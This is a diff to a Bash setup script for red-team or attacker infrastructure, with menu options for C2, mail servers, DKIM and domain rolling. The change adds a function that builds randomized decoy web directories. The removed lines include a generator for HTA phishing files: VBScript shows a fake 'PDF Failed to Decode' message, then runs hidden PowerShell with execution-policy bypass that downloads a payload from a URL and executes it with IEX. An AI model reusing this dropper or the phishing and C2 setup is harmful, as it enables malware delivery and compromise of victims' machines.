@@ -7,7 +7,7 @@ updateIP="<EXT IPaddr>"
 RED='\033[0;31m'
 LRED='\033[1;31m'
 GREEN='\033[0;32m'
-LGREEN='\033[1;31m'
+LGREEN='\033[1;32m'
 NC='\033[0m' # No Color
 
 if [[ $EUID -ne 0 ]]; then
@@ -24,7 +24,7 @@ function debian_initialize() {
     echo "...keep waiting..."
     apt-get -qq -y upgrade > /dev/null 2>&1
     echo -n "almost there..."
-    apt-get install -qq -y nmap apache2 curl tcpdump > /dev/null 2>&1
+    apt-get install -qq -y nmap jq apache2 curl tcpdump > /dev/null 2>&1
     apt-get install -qq -y procmail dnsutils screen zip ufw > /dev/null 2>&1
     echo -n "don't be impatient..."
     apt-get remove -qq -y exim4 exim4-base exim4-config exim4-daemon-light > /dev/null 2>&1
@@ -147,25 +147,6 @@ ENDOFRULES
     ip6tables-restore /etc/iptables/rules.v6
     iptables -D ufw-before-input 4 2>&1
     iptables -D ufw-before-input 3 2>&1
-}
-
-function add_firewall_rule() {
-    echo $'\nBefore continuing, make sure you have... \n\ttarget/host file with all your allowed hosts/ranges\n\tport file with all your allowed ports\n'
-    read -p "Enter your server IP address: " -r ipaddr
-    tgtsfile="/root/hosts.txt"
-    prtsfile="/root/ports.txt"
-    read -e -i "$tgtsfile" -p "Enter ALLOWED host file [full path]: " -r targetsfile
-    read -e -i "$prtsfile" -p "Enter ALLOWED port file [full path]: " -r portsfile
-    echo $'\n'
-    targetsfile="${targetsfile:-$tgtsfile}"
-    portsfile="${portsfile:-$prtsfile}"
-    printf 'y\n' | ufw enable > /dev/null 2>&1
-    for host in $(cat $targetsfile)
-        do for portno in $(cat $portsfile)
-            do ufw allow proto tcp from $host to $ipaddr port $portno > /dev/null 2>&1
-        done
-    done
-    ufw status numbered
 }
 
 function install_ssl_Cert() {
@@ -970,51 +951,107 @@ function check_dkim() {
     fi
 }
 
-function check_arecord() {
-    read -p 'Enter your A Record domain name:  ' -r domain
-    echo " "
-    echo "[ / ] Checking A Record population "
-    sleep 1
-    count=1
-    while [ $count -gt 0 ]
-    do
-        if [[ $(nslookup ${domain}) != *find* ]]
-            then count=0
-            echo "[ + ] A record populated"
-            echo " "
-            else echo -n "."
-            sleep 10
-            (( count++ ))
+function random_web_structure() {
+    checkCommand=$( dpkg --get-selections | grep -E -v "deinstall" |grep '^jq' )
+    stringarray=($checkCommand)
+    if [[ -z $stringarray ]]
+    then 
+        apt -y -qq install jq
+    fi
+
+    wordArray=( `curl -s -k 'https://randomwordgenerator.com/json/fake-words.json' -A "Mozilla/5.0 (Windows NT 10.0; rv:106.0) Gecko/20100101 Firefox/106.0" | jq -r '.[] | .[].word'` )
+
+    chosenArray=()
+
+    for element in ${wordArray[@]}
+    do 
+    # the hash-sign within a variable provides the length of the variable output
+        if [[ ${#element} -ge 6 ]];
+        then
+            if [[ ${#element} -le 11 ]];
+            then   
+                chosenArray+=(${element});
+            fi
         fi
     done
-    printf 'y\n' | ufw enable > /dev/null 2>&1
-}
 
-function hta_create() {
-    read -p 'Enter the client name:  ' -r ClientName
-    read -p 'Full URL to payload file: (ie: http://1.2.3.4:80/file) ' -r ServedFile
-    read -p 'Enter name for HTA file: (e.g. employee-survey.hta) ' -r NameHTA
-    cd /var/www/html
-    cat <<-EOF > /var/www/html/${NameHTA}
-<script language="VBScript">
-    Function var_func()
-        Dim var_shell
-        Set var_shell = CreateObject("Wscript.Shell")
-        var_shell.run "powershell.exe -exec bypass -w hidden -command \$wc = New-Object System.Net.Webclient; \$wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 6.1; WOW64;Trident/7.0; AS; rv:11.0) Like Gecko'); \$wc.proxy= [System.Net.WebRequest]::DefaultWebProxy; \$wc.proxy.credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; IEX (\$wc.downloadstring('${ServedFile}'))", 0, true
+    curl -s -q -k 'https://randomwordgenerator.com/json/sentences.json' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:106.0) Gecko/20100101 Firefox/106.0' | jq -r '.[] | .[].sentence' > sentences.raw
 
-    End Function
+    ### Randomizing Directory Structure
+    one=${chosenArray[RANDOM% ${#chosenArray[@]}]}
+    fetchOne=$( curl -s -k -q 'http://www.unit-conversion.info/texttools/randomcase/?ajax=1' -X POST -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:106.0) Gecko/20100101 Firefox/106.0' --data-raw "form%5Btext%5D=${one}&out=" )
 
-    Function TestBox()
-        Msgbox "${ClientName} (PDF Failed to Decode!)"
-    End Function
+    two=${chosenArray[RANDOM% ${#chosenArray[@]}]}
+    fetchTwo=$( curl -s -k -q 'http://www.unit-conversion.info/texttools/randomcase/?ajax=1' -X POST -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:106.0) Gecko/20100101 Firefox/106.0' --data-raw "form%5Btext%5D=${two}&out=" )
 
-    TestBox
-    var_func
+    three=${chosenArray[RANDOM% ${#chosenArray[@]}]}
+    fetchThree=$( curl -s -k -q 'http://www.unit-conversion.info/texttools/randomcase/?ajax=1' -X POST -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:106.0) Gecko/20100101 Firefox/106.0' --data-raw "form%5Btext%5D=${three}&out=" )
 
-    self.close
-</script>
+    webDir=""
+
+    if [[ -d "/var/www/html" ]]; then
+        webDir="/var/www/html";
+    elif [[ -d "/var/www/" ]]; then
+        webDir="/var/www";
+    fi
+
+    newDirStructure="${webDir}/${fetchOne}/${fetchTwo}/${fetchThree}"
+
+    mkdir -p $newDirStructure
+
+    ### Creating index.html and randomizing contents within the file
+
+    dirOne="${webDir}/${fetchOne}/index.html"
+    dirTwo="${webDir}/${fetchOne}/${fetchTwo}/index.html"
+    dirThree="${webDir}/${fetchOne}/${fetchTwo}/${fetchThree}/index.html"
+
+    tagArray=("p" "b" "h1" "h2" "h3" "h4" "h5" "pre" "hr")
+    tagOne=${tagArray[RANDOM% ${#tagArray[@]}]}
+    tagTwo=${tagArray[RANDOM% ${#tagArray[@]}]}
+    tagThree=${tagArray[RANDOM% ${#tagArray[@]}]}
+
+    sentenceOne=$( cat sentences.raw | shuf -n 1 )
+    sentenceTwo=$( cat sentences.raw | shuf -n 1 )
+    sentenceThree=$( cat sentences.raw | shuf -n 1 )
+
+    cat <<-EOF > $dirOne
+<html>
+    <head>
+    </head>
+    <body>
+        <$tagOne>$sentenceOne</$tagOne>
+    </body
+</html>
+
 EOF
-    printf 'y\n' | ufw enable > /dev/null 2>&1
+
+    cat <<-EOF > $dirTwo
+<html>
+    <head>
+    </head>
+    <body>
+        <$tagTwo>$sentenceTwo</$tagTwo>
+    </body
+</html>
+
+EOF
+
+    cat <<-EOF > $dirThree
+<html>
+    <head>
+    </head>
+    <body>
+        <$tagThree>$sentenceThree</$tagThree>
+    </body
+</html>
+
+EOF
+
+    rm sentences.raw
+    chown -R www-data:www-data $newDirStructure
+    echo ""
+    echo -e "${LGREEN}    [+] Your random web structure is:  ${newDirStructure}${NC}"
+    echo ""
 }
 
 function smb_share() {
@@ -1396,7 +1433,7 @@ cat <<-EOF
 EOF
 
 PS3="Server Setup Script - Pick an option: "
-options=("Debian Prep" "Account Setup" "Install SSL" "Install Mail Server" "Setup HTTPS Website" "HTTPS C2 Done Right" "Get DNS Entries" "Create HTA File" "Check DKIM" "Check A Records" "UFW allow hosts" "Setup SMB Share" "Setup WebDAV Share" "Install WebMail" "Roll da Domain" "Install VPN" "Obtain DNS Server")
+options=("Debian Prep" "Account Setup" "Install SSL" "Install Mail Server" "Setup HTTPS Website" "HTTPS C2 Done Right" "Randomize Web Structure" "Get DNS Entries" "Check DKIM" "Setup SMB Share" "Setup WebDAV Share" "Install WebMail" "Roll da Domain" "Install VPN" "Obtain DNS Server")
 select opt in "${options[@]}" "Quit"; do
 
     case "$REPLY" in
@@ -1414,27 +1451,23 @@ select opt in "${options[@]}" "Quit"; do
 
     6) httpsc2doneright;;
 
-    7) get_dns_entries;;
-        
-    8) hta_create;;
+    7) random_web_structure;;
+
+    8) get_dns_entries;;
         
     9) check_dkim;;
-        
-    10) check_arecord;;
-        
-    11) add_firewall_rule;;
 
-    12) smb_share;;
+    10) smb_share;;
     
-    13) webdav_share;;
+    11) webdav_share;;
     
-    14) webmail_install;;
+    12) webmail_install;;
 
-    15) roll_domain;;
+    13) roll_domain;;
 
-    16) wireguard_install;;
+    14) wireguard_install;;
 
-    17) obtain_dns_server;;
+    15) obtain_dns_server;;
 
     $(( ${#options[@]}+1 )) ) echo "Goodbye!"; break;;
     
